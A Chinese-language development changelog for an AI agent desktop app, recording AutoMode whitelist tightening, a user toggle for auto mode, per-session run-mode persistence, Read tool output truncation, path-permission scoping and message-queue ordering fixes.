- **Why**: 用户希望项目 chip 鼠标悬停时只显示完整路径，不要 `allowed` 等标签；同时 workdir 与 allowed paths 要有清晰视觉分隔
- **改动**:
  - [apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx](../apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx): 项目 chip 的 hover 内容改为 workdir 路径在上、双分割线、allowed paths 路径列表在下
- **影响范围**: 仅 Desktop 前端展示；不改协议、不改持久化、不影响项目/会话数据
- **留尾巴**: 无

### 2026-05-19 — 修正 VS Code workspace 导入的相对路径转换规则

- **Why**: 用户导入 `../../other/hebbian.code-workspace` 时发现，`../rust/hebbian` 被保存成带 `other/..` 的未归一化绝对路径，后续 `sub2api` 又被错误拼到 workdir 下；实际期望是第一个 folder 变成规范全局 workdir，其余相对 folder 按原 workspace 文件位置解析后，再保存成相对 workdir 父目录的相对路径
- **改动**:
  - [crates/agent-core/src/storage/projects.rs](../crates/agent-core/src/storage/projects.rs): VS Code workspace 导入新增 lexical path normalize；首个 folder 规范化为绝对 workdir；后续相对 folder 改写为相对 workdir 父目录的路径，绝对 folder 继续保存为规范绝对路径；新增覆盖 `../rust/hebbian` / `sub2api` / `../claude-code-haha` / `../rust/cc-switch` 的回归测试
  - [docs/架构.md](架构.md): 同步更新 `importVscodeProject` 的路径归一化语义
- **影响范围**: agent-core storage / Desktop 导入项目命令；不改项目 JSON 字段结构，不影响已有项目文件，后续重新导入 VS Code workspace 会按新规则落盘
- **留尾巴**: 已导入过的旧项目不会自动迁移，需要用户重新导入或手动调整项目目录


### 2026-05-19 — AutoMode 收尾：CLI 路径回退、白名单 exact match、Desktop `//` 命令系统落地

- **Why**: 上一条 AutoMode 落地把 `--force-automode` flag / REPL 命令塞进了 `apps/cli`，但 changelog 早就写过"先不考虑 tui cli"且 `apps/cli` 已经从 Cargo workspace 排除，那条改动方向错了；同时白名单的 substring 匹配过宽，`gpt-5.5-mini` 这种"基础名同、能力差很多"的模型会误开 AutoMode；需要把唯一 surface（Desktop）补上等价的入口
- **改动**:
  - [apps/cli/src/main.rs](../apps/cli/src/main.rs) / [apps/cli/src/session.rs](../apps/cli/src/session.rs): 完全 revert 上一条加的 `--force-automode` flag + REPL `/force-automode` 命令——cli 已脱离 workspace，不再维护
  - [crates/agent-core/src/automode.rs](../crates/agent-core/src/automode.rs): `AUTOMODE_ALLOWED_MODELS` 从 substring 匹配改为 exact match，白名单收紧到 `&["opus-4-7", "opus4.7", "gpt-5.5"]`；带前缀（`claude-opus-4-7`）/ 后缀（`gpt-5.5-preview` / `gpt-5.5-mini` / `opus-4-7-20260416`）一律降级 Ask；新增 `is_allowed_model` 单测覆盖三类拒绝场景；上一条遗留的 substring 留尾巴清掉
  - [docs/架构.md](../docs/架构.md): §3.3 / §6.1 / §6.3.1 / §10.3 / §16 / §13 / §14 清扫 CLI / TUI / REPL / `--mock` 残留；§13 删 D7 + 8.3.x 系列 8 行；§14 步骤表把 CoreClient 转发收敛到 Desktop、删 Step 13 TUI；新增 §8 "Desktop 命令系统"章节定义 `//` 前缀的本地命令派发规范（前端拦截 / fail-closed / 三层后端落点）
  - [CLAUDE.md](../CLAUDE.md): 清扫第 34 / 161 行的 CLI / TUI / REPL / hebbian-cli 残留
  - [apps/desktop/src/force_automode.rs](../apps/desktop/src/force_automode.rs): 新增进程级 `ForceAutomodeState`（`Mutex<HashMap<session_id, bool>>`），重启回归 `false`；选 in-memory 而非写 session.json 的理由：危险开关重启回归默认更安全，且老 session 反序列化无需迁移
  - [apps/desktop/src/lib.rs](../apps/desktop/src/lib.rs): 注册 `ForceAutomodeState`；新增 `get_force_automode` / `set_force_automode` Tauri command；`send_message` 拿 State 注入到 `SendArgs.force_automode`
  - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs): `SendArgs` 加 `force_automode: bool`，构造 `SessionConfig` 时透传（替换原硬编码 `false`）
  - [apps/desktop/frontend/src/desktop/ui/lib/slashCommands.ts](../apps/desktop/frontend/src/desktop/ui/lib/slashCommands.ts): 新增 `dispatchSlashCommand`，注册表只挂 `force-automode` 一条，支持 `on/off/toggle/status`（无参 = toggle）；未知命令 / 参数非法走 toast error；输入框 onSubmit 命中 `//` 前缀时一律本地派发
  - [apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx](../apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx): submit 路径在 `/compact` 拦截之后、`onSend` 之前调 `dispatchSlashCommand`；命中即清输入框 / 重置历史光标，错误走 toast
  - [apps/desktop/frontend/src/desktop/bridge/tauri.ts](../apps/desktop/frontend/src/desktop/bridge/tauri.ts): 新增 `api.getForceAutomode` / `api.setForceAutomode`
- **影响范围**:
  - `apps/cli` 回到上一条 AutoMode 改动**之前**的状态（除已经修的 shell_parse.rs，那部分保留）
  - `SendArgs` 加 `force_automode: bool` 字段——chat.rs 内部测试两处构造点已同步补 `force_automode: false`
  - 协议无变化（只是 Tauri command 新增 2 个，不影响 send_message 既有签名）
  - 架构.md 减小覆盖面：CLI / TUI / REPL 全部移出唯一设计准则，新增 §8 章节正式收纳 `//` 命令规范
- **留尾巴**:
  - 🟡 §8 命令清单当前只有 `//force-automode` 一条，后续按需追加 `//run-mode <mode>` / `//clear` / `//compact <hint>`（把 ChatInput.tsx 里硬编码的 `/compact` 拦截搬过来统一）
  - 🟡 前端没有可视化徽章显示 `force_automode` 当前状态——目前用 `//force-automode status` 查；后续如果要做 status pill，从 `api.getForceAutomode` 拉就行
  - 🟡 `force_automode` 不持久化的取舍可能要复盘：用户重启 desktop 后会"以为还开着"。当前依赖 toast 反馈 + status 子命令兜底，等多用户后看是否需要落 session
  - 🟡 上一条 changelog 提的"判官 prompt 英文严格格式"的兜底观察期继续——本次没动 prompt 文件
- **关联**: 架构 §4.4.4 / §8 / §13；上一条 changelog（同日 AutoMode 落地）

### 2026-05-19 — 将允许访问项统一迁移为 allowed_paths 并增强路径列表 UI

- **Why**: 用户指出允许访问项已经同时包含目录和文件，继续使用 allowed_dirs / 允许目录会误导；左侧项目允许列表也需要限制行数、超出滚动，并区分目录与不同类型文件
- **改动**:
  - [crates/agent-core/src/storage/settings.rs](../crates/agent-core/src/storage/settings.rs) / [crates/agent-core/src/storage/sessions.rs](../crates/agent-core/src/storage/sessions.rs) / [crates/agent-core/src/storage/projects.rs](../crates/agent-core/src/storage/projects.rs): 持久化字段统一写出 `allowed_paths` / `runtime_allowed_paths` / `pending_runtime_allowed_paths`；读侧保留旧 `allowed_dirs` 系列 alias；新增兼容测试覆盖旧设置、旧 rollout meta、旧项目输入
  - [crates/agent-core/src/workspace.rs](../crates/agent-core/src/workspace.rs) / [crates/agent-core/src/session.rs](../crates/agent-core/src/session.rs) / [crates/agent-core/src/tools](../crates/agent-core/src/tools): 内部注释、workspace-update 文案、工具描述从允许目录改为允许路径
  - [apps/desktop/frontend/src/desktop/ui/components/workspaceFields.tsx](../apps/desktop/frontend/src/desktop/ui/components/workspaceFields.tsx): `DirListField` 改为 `PathListField`，支持分别添加文件/文件夹，文件按常见类型显示不同 lucide 图标，列表支持 `maxVisibleRows` 后滚动
  - [apps/desktop/frontend/src/desktop/ui/components/Sidebar.tsx](../apps/desktop/frontend/src/desktop/ui/components/Sidebar.tsx): 项目详情里的允许路径列表最多显示 5 行，超出滚动；文案改为“允许访问的路径”
  - [apps/desktop/frontend/src/desktop/ui/components/AppSettingsDialog.tsx](../apps/desktop/frontend/src/desktop/ui/components/AppSettingsDialog.tsx) / [apps/desktop/frontend/src/desktop/ui/components/SessionSettingsDialog.tsx](../apps/desktop/frontend/src/desktop/ui/components/SessionSettingsDialog.tsx) / [apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx](../apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx) / [apps/desktop/frontend/src/desktop/ui/components/PermissionApprovalPopup.tsx](../apps/desktop/frontend/src/desktop/ui/components/PermissionApprovalPopup.tsx): UI 文案统一为允许路径；输入框菜单增加“允许访问文件 / 允许访问文件夹”，chip 图标按路径类型区分
  - [docs/架构.md](架构.md): 同步 `folders[1..]`、模板变量和 storage 布局中的 `allowed_paths` 语义
- **影响范围**:
  - agent-core storage / workspace / prompt 注入文案；Desktop frontend workspace/project/session settings；Tauri 参数保持 camelCase `allowedPaths`
  - 向后兼容旧 `allowed_dirs` JSON / jsonl 字段，保存后会按新字段写出；CLI 参数名从 `--allowed-dir` 收敛为 `--allowed-path`
- **留尾巴**: 无


### 2026-05-19 — Desktop ChatInput 加号右侧增设 `//` 命令 popup 与 RunMode chip

- **Why**: 用户希望在输入框工具栏看到一个一目了然的入口——`//` 按钮列出注册的所有命令、命中后填入输入框等敲参数；mode chip 实时显示当前 RunMode 并支持下拉切换。原 `//force-automode` 只能键盘敲，对鼠标党不友好；同时 RunMode 在后端长期被写死 `RunMode::default()`，前端从未接入切换路径
- **改动**:
  - [apps/desktop/src/run_mode_state.rs](../apps/desktop/src/run_mode_state.rs): 新增进程级 `RunModeState`（`Mutex<HashMap<session_id, RunMode>>`），复用 ForceAutomodeState 的 in-memory pattern；重启回归 `AskBeforeEdits`
  - [apps/desktop/src/lib.rs](../apps/desktop/src/lib.rs): 注册 `RunModeState`；新增 `get_run_mode` / `set_run_mode` Tauri command（后者校验字符串可被 `RunMode::parse` 解析）；`send_message` 新增 `run_mode: State<...>` 注入并往 `SendArgs` 透传
  - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs): `SendArgs` 加 `run_mode: RunMode` 字段，构造 `SessionConfig` 时替换原硬编码 `RunMode::default()`；测试构造点同步补默认值
  - [apps/desktop/frontend/src/desktop/bridge/tauri.ts](../apps/desktop/frontend/src/desktop/bridge/tauri.ts): 新增 `api.getRunMode` / `api.setRunMode`
  - [apps/desktop/frontend/src/desktop/ui/lib/slashCommands.ts](../apps/desktop/frontend/src/desktop/ui/lib/slashCommands.ts): 暴露 `SlashCommandMeta` 与 `slashCommandCatalog`——是 popup 的数据源；同步 `parseBoolArg` 的大小写归一化，避免 `On/OFF/Toggle` 这种混合大小写命中默认分支
  - [apps/desktop/frontend/src/desktop/ui/components/SlashCommandButton.tsx](../apps/desktop/frontend/src/desktop/ui/components/SlashCommandButton.tsx): 新增；工具栏 `//` 图标按钮 + popup 渲染 `slashCommandCatalog`，点击回调把 `//${name} ` 写入输入框
  - [apps/desktop/frontend/src/desktop/ui/components/RunModeChip.tsx](../apps/desktop/frontend/src/desktop/ui/components/RunModeChip.tsx): 新增；显示当前 RunMode 的人类可读 label（"Ask before edits" / "Edit automatically" / "Plan mode" / "Auto mode"），点击下拉切换，调 `api.setRunMode` 并本地 setState
  - [apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx](../apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx): 把原加号 wrapper 改成水平 group 容纳 `SlashCommandButton` 与 `RunModeChip`；右侧 ModelPicker / 发送按钮不动；`//` popup 命中后 `setValue` 追加在末尾并 focus 输入框光标到末尾（保持已有草稿不被覆盖）
  - [docs/架构.md](../docs/架构.md): §8.1 加原则 6（工具栏入口与 `//` 命令并存）；§8.2 表加 `//run-mode` 行与"工具栏入口"列
- **设计取舍**:
  - **RunMode in-memory 而非持久化**：先做到能切 + 立即生效。等多用户反馈"切完关掉再开希望保留"再统一搬到 session.json；现在持久化要先解决老 jsonl 兼容 / prompt cache 边界 / Switch marker 是否插入等问题，本期不掺这个雷
  - **mode chip 不挂 `//` 命令文字**：避免与 `//force-automode` 这种"子开关"类命令在 popup 列表里互相干扰；命令清单（架构 §8.2）依然把 mode chip 当作 §8 命令系统的一员登记，理由是它们共享相同的 Tauri command pattern 与失败语义
  - **popup 命中后填入输入框（而非直接执行）**：用户决策。`//force-automode` 在不带参数时是 toggle，带参数时是 set——填入输入框让用户决定要不要补参，比"无脑 toggle"对预期更友好
- **影响范围**:
  - 协议无变化（新增两个 Tauri command，不破坏既有 send_message 签名——`run_mode` 字段是 State 注入，IPC 入参不变）
  - `SendArgs` 加 `run_mode` 字段；chat 内部两处测试构造点已同步
  - 老 session 不影响：进程级 state 默认 `AskBeforeEdits`，与之前硬编码值一致
- **留尾巴**:
  - 🟡 RunMode 不持久化：用户重启 desktop 后会回到 `AskBeforeEdits`，可能与上次工作期望不一致；当 mode chip 也加可视化 badge 提示"刚刚重置过"时再复盘
  - 🟡 切到 `AutoMode` 时若当前模型不在白名单（不是 opus-4-7 / gpt-5.5），目前 chip 静默切换、运行时 `judge_auto_mode` 才返回 Ask 降级；后续可以在 chip 切换时做一次 model 白名单 precheck，给出 toast 警告
  - 🟡 `PlanMode` 在 dispatcher 里的工具过滤当前还是 TODO（架构 §4.4.5 占位），切到 PlanMode 暂时跟 AskBeforeEdits 行为一致——chip 本身已经能切，等 PlanMode 实装时无需再改前端
- **关联**: 架构 §4.4.3 / §8.1 / §8.2；与上一条 changelog（AutoMode 收尾）同日续作


### 2026-05-19 — RunMode 升级为 Session 持久化字段（替换上一条的 in-memory 方案）

- **Why**: 上一条 changelog 把 RunMode 放在 desktop 进程级 `RunModeState` 里，用户重启或换窗口就丢失，与"已有对话的 mode 跟着对话走"的直觉不符；用户明确要求把 mode 持久化到 Session 配置里
- **改动**:
  - [crates/agent-core/src/storage/sessions.rs](../crates/agent-core/src/storage/sessions.rs): `Session` / `RolloutMeta` / `MetaUpdate` 三处都加 `run_mode` 字段，全部带 `#[serde(default)]`——老 jsonl / 老 `.json` 反序列化回退 `AskBeforeEdits`，与切换前硬编码行为一致；`meta_from_session` / `apply_meta` / `apply_update` 透传；`read_jsonl` 初始化 Session、`create_with_source` / `fork` 构造点补字段；新增 `sessions::set_run_mode(data_dir, id, mode)` helper，**追加一行 `RolloutLine::MetaUpdate { run_mode: Some(_) }`**（不重写 messages），与 `rename` 同 pattern
  - [apps/desktop/src/run_mode_state.rs](../apps/desktop/src/run_mode_state.rs): **删除**——in-memory 中间层不再需要
  - [apps/desktop/src/lib.rs](../apps/desktop/src/lib.rs): 删 `RunModeState` 模块 / pub use / `.manage()`；`get_run_mode` 改为 `sessions::load(...).run_mode`；`set_run_mode` 改为 `sessions::set_run_mode(...)`；`send_message` 不再注入 RunMode State——run_mode 由 chat.rs 内部从 `prior_session` 取
  - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs): `SendArgs` 去掉 `run_mode` 字段；构造 `SessionConfig` 时改为 `run_mode: prior_session.run_mode`；测试构造点对应回收
  - [docs/架构.md](../docs/架构.md): §4.4.3 新增"持久化"小段，说明 `Session.run_mode` + `MetaUpdate` append-only 切换路径；§8.1.3 把命令后端落点分类改为"进程级 / 会话级持久 / agent-core API"三档；§8.2 表里 `//run-mode` 行的"后端 Tauri commands"列补注"落到 `Session.run_mode`，跨重启保留"
- **设计取舍**:
  - **MetaUpdate append 而非 save 全量重写**：rename 走的就是这套；RunMode 切换频率可能高（用户调几下试），全量重写大 session.jsonl 会是浪费
  - **从 `RunModeState` in-memory 改为 Session 字段**：本来 force_automode 是"危险开关重启回归默认"的语义所以 in-memory 合理；RunMode 是会话级偏好，跟着 Session 走更符合用户预期；多窗口共享 desktop 进程时也保证一致（虽然 in-memory 在同进程也 OK，但 fail-safe 多一层）
  - **prompt cache 不受影响**：架构 §4.4.3 早定下"mode 不进 system prompt"，新增字段也只影响 storage 层与 SEMI 段；prompt cache 命中边界不变
- **影响范围**:
  - `Session` / `RolloutMeta` / `MetaUpdate` schema 字段新增——老数据完全兼容（`#[serde(default)]` 兜底为 `AskBeforeEdits`），但已经写过新字段的 jsonl 不能被旧版本 hebbian 二进制读（因为旧版没有 RunMode 反序列化器）——本仓库单向演进，不构成问题
  - `SendArgs.run_mode` 字段移除——之前唯一调用点是 desktop 的 `send_message`，已同步更新；CLI 路径不受影响（已脱离 workspace）
  - 桌面 in-memory `RunModeState` 完全删除
- **留尾巴**:
  - 🟡 mode chip 切换到 `AutoMode` 时，如果当前 session.model 不在白名单（不是 opus-4-7 / gpt-5.5），目前 chip 静默落盘、运行时 `judge_auto_mode` 才降级为 Ask；后续给 chip 加一次 model 白名单 precheck + toast 警告
  - 🟡 `PlanMode` 的工具过滤仍是 TODO（§4.4.5 占位）；切到 PlanMode 现在能落盘了，但运行时与 AskBeforeEdits 行为一致
  - 🟡 `MetaUpdate` 行随时间累积——每切换一次 RunMode 多一行 jsonl；与 `rename` 同性质，目前不做 compaction
- **关联**: 架构 §4.4.3 / §6.2 / §8；与上一条 changelog（mode chip 工具栏入口）同日续作

### 2026-05-19 — Read 工具重构：单行截断 + 整体 6KB 截断 + 豁免 materialize 落盘

- **Why**: 
  - 死循环：Read 读一个 2000 行的常规源文件 → 输出 ~100KB → dispatch `materialize_tool_output` 把整份落盘到 `tool_results/<call_id>.txt`、inline 给"完整内容已落盘到 xxx → 请用 Read 翻页"指针 → agent 照做，Read 这个落盘文件 → 又 100KB → 又落盘 → 死循环
  - 根因：Read 是**分页工具**，本身提供 offset/limit 翻页，再叠一层 materialize 语义重复且误导向落盘文件触发的二次 Read
  - 与 Claude Code 对照分析（对 2.1.143 二进制 `strings` 转储反推）：CC Read 描述里写 "verbatim file content"（逐字原文），不做单行截断，不做整体落盘，没有 MAX_FILE_BYTES 硬拒绝——完全信任 agent 用 offset/limit 自控。但 hebbian 没有 CC 服务端的 context compaction 兜底，需要安全网
- **改动**:
  - [crates/agent-core/src/tools/read.rs](../crates/agent-core/src/tools/read.rs): 
    - 新增 `data_dir` / `session_id` 字段（≥ `ReadTool::new` 接受），用于超长行剩余部分落盘
    - **单行截断**：行 > 2000 字符时截断，inline 显示前 2000 字符 + `…[截断，剩余 N 字符已落盘 /path]`；剩余部分保存到 `<data_dir>/sessions/<sid>/line_trunc/<file_hash>_L<line>.txt`，按 ~2000 字符换行
    - **整体 6KB 输出截断**：输出超 ~6KB 后停止追加新行，附加 `[输出截断：已显示 N 行。后续约 M 行未显示。请用 offset/limit 翻页读取（当前 offset=X limit=Y）。]` —— **不落盘**，不给出"请用 Read 读这个文件"的指针
    - 无 `data_dir` / `session_id` 时，超长行截断仅标注剩余字符数，不落盘
  - [crates/agent-core/src/tools/mod.rs](../crates/agent-core/src/tools/mod.rs): `default_tools` 签名加 `data_dir: Option<PathBuf>` / `session_id: Option<String>`，透传给 `ReadTool::new`
  - [crates/agent-core/src/dispatch.rs](../crates/agent-core/src/dispatch.rs): `materialize_tool_output` 豁免 Read（`call.name == "Read"` 时跳过落盘 + `truncate_tool_result`），Read 自身已做截断控制
  - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs): 两处 `default_tools` 调用传 `Some(data_dir)` / `Some(session_id)`（主路径）或 `None, None`（工具预览路径）
  - [apps/cli/src/main.rs](../apps/cli/src/main.rs): 同步新签名（CLI 已从 workspace 排除，仅为避免复活时编译错误）
- **设计取舍**:
  - **不全文落盘**（与 old materialize 行为断舍离）：Read 是分页工具，落盘 + 指针诱导 agent 读落盘文件 → 文件又触发 materialize → 死循环。改为截断后仅给 offset/limit 提示，agent 天然知道怎么翻页
  - **长行截断后落盘（而不是完全不截断）**：CC 的 "verbatim" 策略在 hebbian 没有 compaction 兜底时风险太高（单行 minified JS 50KB 直通模型可能撑爆上下文窗口）；截断 + 落盘剩余部分 = 安全网
  - **保留 `MAX_FILE_BYTES = 5MB`**：与 CC 不同，但 hebbian 纯读文件不需要 agent 阅读 >5MB 的二进制；agent 真需要时可以用 `Bash + head -c` 或者 Grep 切片
- **影响范围**:
  - agent-core: Read 工具 / `default_tools` / dispatch materialize 路径
  - desktop: `chat.rs` 两处调用点
  - CLI: 签名同步（已脱离 workspace）
  - 协议无变化（EventPayload / ToolResult 不变；Read 不再产生 artifact_path，前端 MessageBubble 已有 `artifact_path = None` 处理）
  - 前端无变化
- **留尾巴**:
  - 🟡 超长行剩余文件（`line_trunc/` 目录）不随 session 删除自动清理——单行截断场景罕见（minified JS / 巨大 JSON single-line），累积量可忽略
  - 🟡 `MAX_FILE_BYTES = 5MB` 硬拒绝可在用户反馈后再评估是否去除或提高
- **关联**: Claude Code 2.1.143 binary 对照分析（`wpH=2000`、verbatim 语义、无 artifact 落盘）；架构 §4.4 / §4.4.9

### 2026-05-19 — dispatch 路径越界检查：hebbian 数据目录自动放行

- **Why**: Read 截断落盘的 `line_trunc/` 文件位于 `~/.hebbian/sessions/<sid>/` 下，agent 尝试读取这些文件时会触发 PathAccess 审批——但这些是 agent 自己的工具输出，不该走权限系统。同理 `tool_results/`、`bg/` 等 hebbian 内部文件都应在界内
- **改动**:
  - [crates/agent-core/src/dispatch.rs](../crates/agent-core/src/dispatch.rs): `out_of_scope` 过滤加第二道 `filter`：以 `<data_dir>/sessions/<session_id>/` 为前缀的路径视为在界内，不触发 PathAccess 审批。范围限定在当前 session 目录（`tool_results/`、`line_trunc/`、`bg/` 等），不包含 `~/.hebbian/settings.json`、`permissions.json` 等配置文件
- **影响范围**: agent-core dispatch；不影响已有 HITL 审批逻辑（路径不在当前 session 目录下仍按原规则检查）
- **留尾巴**: 无

### 2026-05-19 — 修复 Desktop 多会话并行发送与流式插队顺序

- **Why**: 用户反馈一个对话运行时，其他对话和新建对话的发送按钮一直转圈、不能发送；同一对话运行时引导插队也被挡住；并且插队 user message 会在持久化历史里跑到当前正在输出的 assistant 前面
- **改动**:
  - [apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx](../apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx): 发送按钮的 `sending` 只覆盖本次提交动作，不再等待整轮 `sendUserMessage` 完成；后台 run 的状态由 `sessionStreams` / `isStreaming` 驱动
  - [apps/desktop/frontend/src/desktop/ui/store/useStore.ts](../apps/desktop/frontend/src/desktop/ui/store/useStore.ts): `sendUserMessage` 内部改为按 session 执行，队列 `drainNext` 不再依赖当前打开的 session；切到其他对话后，原对话的 queued input 仍能按 FIFO 继续发
  - [crates/common/src/runtime.rs](../crates/common/src/runtime.rs) / [crates/agent-core/src/agent_loop.rs](../crates/agent-core/src/agent_loop.rs) / [crates/agent-core/src/harness.rs](../crates/agent-core/src/harness.rs) / [crates/agent-core/src/session.rs](../crates/agent-core/src/session.rs): 在 `PendingInputs` 外增加已消费副本 `ConsumedPendingInputs`，agent_loop drain 插队输入时同步记录，供 surface 在 run 结束后落盘
  - [apps/desktop/src/lib.rs](../apps/desktop/src/lib.rs): `inject_user_message` 只注入当前 run，不再立即 append 到 session.jsonl；run 已结束时返回错误，让前端保留队列项供重试
  - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs): run 正常完成后先落当前 assistant，再把已消费和未消费的 pending user message 排到 assistant 后面落盘；新增单测覆盖"模型看见插队输入 + jsonl 顺序为 user → assistant → 插队 user"
- **影响范围**: desktop 前端 store/input、desktop Tauri chat 路径、agent-core run 参数、common runtime；协议 `EventPayload` 与 Tauri `send_message` IPC 入参不变，老 session 文件兼容
- **留尾巴**: 中断 / 失败路径仍按现有 partial assistant + marker / failed assistant 逻辑收尾，未额外追加未消费 pending input；如果用户在失败前刚点引导，前端队列项会因 `inject_user_message` 失败还原，已成功注入但 run 随后失败的极端场景后续可再细化恢复策略

### 2026-05-19 — 修复引导消息在最终 ModelStep 后不继续同一 Run

- **Why**: 用户反馈"发送立即引导的消息"虽然发送出去了，但没有在当前 `agent_loop` 的下一轮立刻生效；根因是 `PendingInputs` 只在外层 loop 顶部 drain，模型若在当前 ModelStep 直接 `Done`，run 会立即结束，插队消息只会被保存而不会触发同一个 run 内的下一次模型请求；同时 Harness 的关键事件异步发送可能让 `TurnFinished` 被后续 `TextDelta` 超车，影响按 Turn 分段保存
- **改动**:
  - [crates/agent-core/src/agent_loop.rs](../crates/agent-core/src/agent_loop.rs): 抽出 `drain_pending_inputs`，按架构 §4.2/§4.3 在 ToolStep 完成后 drain；`Done` 分支在 Turn 边界 drain 到引导消息时继续同一个 run 的下一次 ModelStep，而不是直接 `RunFinished`
  - [crates/agent-core/src/harness.rs](../crates/agent-core/src/harness.rs): run 事件 sink 先用 `try_send` 保序，只有关键事件遇到满队列才异步兜底，避免 `TurnFinished` 被后续流式增量超车
  - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs): DesktopObserver 增加 Turn 级 assistant 分段；存在已消费引导消息时，保存为 `assistant(当前段) → injected user → assistant(后续段)`，避免同一 run 多段 assistant 被合并后又把 injected user 落到最后
  - 新增回归测试覆盖：最终 ModelStep 期间注入 PendingInputs 后，同一 run 继续第二次模型请求；Desktop 持久化顺序为 `user → assistant1 → injected user → assistant2`
- **影响范围**: agent-core loop / harness event ordering、desktop chat 持久化；不改协议字段、不改 Tauri command 入参、不改前端 UI 临时展示逻辑；session 文件仍是普通 messages 顺序追加
- **留尾巴**: 完整 cargo 验证当前被工作区已有的 `crates/agent-core/src/tools/background.rs` 截断/未闭合 delimiter 阻塞；修复该无关语法错误后需要重跑 `cargo test -p agent-core pending_input_during_final_model_step_continues_same_run`、`cargo test -p hebbian persists_injected_input_between_assistant_turns_in_same_run` 和 `cargo check -p hebbian`

### 2026-05-19 — 修复 ToolStep 后窗口期引导消息晚一轮生效

- **Why**: 继续排查发现，上一条修复覆盖了最终 `Done` 分支，但如果用户的引导消息到达在 ToolStep 后 drain 已经完成、下一次 ModelStep 构造请求之前，下一次请求仍可能看不到这条 `PendingInputs`，表现为"工具调用完成后没有立即插队，agent_loop 继续原来的下一轮"。
- **改动**:
  - [crates/agent-core/src/agent_loop.rs](../crates/agent-core/src/agent_loop.rs): 在每轮 loop 入口、microcompact 和构造 `ModelRequest` 之前补一次 `drain_pending_inputs`，作为 Turn 边界兜底；保留 ToolStep 后 drain 和 `Done` 分支 drain。
  - [crates/agent-core/src/agent_loop.rs](../crates/agent-core/src/agent_loop.rs): 新增回归测试，模拟 `TurnFinished` 事件之后注入引导消息，断言下一次 ModelStep 的请求立刻包含该 user message。
  - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs): 更新插队顺序测试期望，明确保存顺序为 `assistant(正在输出) → injected user → assistant(后续回答)`，不再把前后两段 assistant 合并成一条后再追加 user。
- **影响范围**: agent-core loop 与 desktop chat 单测；不改协议、不改 Tauri command、不改 session 文件结构。
- **留尾巴**: 无。

### 2026-05-19 — 忽略 understand-anything 本地知识图谱产物

- **Why**: 用户明确要求 `understand-anything` 生成目录不要进入提交，只作为本机分析缓存保留。
- **改动**:
  - [.gitignore](../.gitignore): 增加 `.understand-anything/`，避免 `knowledge-graph.json`、`fingerprints.json` 等大文件进入版本库。
- **影响范围**: 仅 Git 忽略规则；不影响代码、协议或运行时。
- **留尾巴**: 无。

### 2026-05-19 — 架构.md 新增 §4.13 Edit Tracker & Edits Worktree（设计 A 段）

- **Why**: 用户要求 Write/Edit 工具支持：(1) 模型 streaming 期间 arguments 实时显示，避免大文件写入卡 UI；(2) Write/Edit 专属 diff 面板（流式期 / 审批期 / 完成期三态一致渲染）；(3) 审批通过/拒绝后 diff 从审批卡流转到 tool_call 详情；(4) 放大模态 + inline/split 切换；(5) git worktree 式回退树——能精确回退某一次历史修改而不影响前后；(6) 跨会话改同一文件要并发安全；(7) 用户机器无 git 时降级提示而不是闷蹦。本条只动文档不动代码，让方案先定稿
- **改动**:
  - [docs/架构.md §3.1](架构.md): 事件流追加 `EditSnapshotCreated / EditReverted / EditRevertFailed` 三个新事件，归类为"编辑快照"
  - [docs/架构.md §3.2](架构.md): 同步 API 追加「编辑历史」组——`listEdits / diffEdit / revertEdit / editsWorktreeStatus`
  - [docs/架构.md §4.13](架构.md): 新增整节"Edit Tracker & Shadow Repo（设计）"，14 个子节描述数据流 / 影子仓粒度 / 锁 / metadata / 协议 / 流式 diff / 三态 UI / 修改树 / 降级 / TTL / 冲突 / Phase 落地
  - [docs/架构.md §6.1](架构.md): 目录布局 `~/.hebbian/sessions/<sid>/` 下补 `edits-worktree/`（含 `.git/` + 镜像树 + `.hebbian-edits.json`），并标注"可选，无 git CLI 时不创建"
  - [docs/架构.md §13](架构.md): 决策表追加 6 行——回退机制 = shadow git 仓（C 方案）、无 git 降级、流式 diff 不扩协议、回退冲突保守、锁粒度按真实路径、TTL 30 天
- **影响范围**: 仅文档；不动协议字节、不动 crate；后续 Phase B/C/D/E 将按本节实现。注意 §4.4.6 列出的 Edit 工具至今未实现（tools/ 下只有 write.rs），Phase B 将补齐——并在那次 changelog 里注明这是文档先行的尾巴清理
- **留尾巴**:
  - 协议事件 `EditAction` enum 的 wire format（snake_case 还是 camelCase）尚未在 §3.1 里固定，Phase C 实现 EventPayload 时按 §4.4.7 命名规范定（snake_case in protocol）
  - edits_worktree_ttl_days 配置项落 settings.json 的位置（global vs per-session）Phase C 一并定
  - `DiffPayload.hunks` 用 similar 还是 imara-diff 选型留待 Phase D（前端不重算，服务端给）
  - Workspace 根之外的允许路径如何映射到 edits-worktree 子目录的命名规则（sha1 哈希？或直接 `absolute/<full_path>/`）Phase C 定

### 2026-05-19 — 对齐 Claude Code 2.1.144 Edit 语义 + 取消 Write 工具 + ReadState Tracker（A 段补丁）

- **Why**: 用户对照 `~/.vscode/extensions/anthropic.claude-code-2.1.144-darwin-arm64/` 内 native binary 提出三件事：(1) Edit/Write 直接对齐 Claude Code 实现，避免出现"功能像但细节差一截"的伪对齐；(2) 不要叫 shadow-repo，命名要跟 git worktree 概念挂钩；(3) 不要 Write 工具，所有写操作走 Edit（创建走 old_string="" 分支）。从 binary strings 抽出 Edit 完整 validation 流程（11 步 errorCode 0-12）/ Write 描述 / readFileState 机制 / `zLH` 容错匹配 / `vOH` 文件锁包装 / `.ipynb` 拒绝等细节，回写到架构.md
- **改动**:
  - [docs/架构.md §4.4.6](架构.md): 工具列表去掉 Write，核心 13→12（衍生 4 不变，总 16）；Edit 描述改为"创建 / 全覆盖 / 局部修改三合一"，old_string="" 时承担创建语义；"已删除"清单加 Write 并注明合并理由
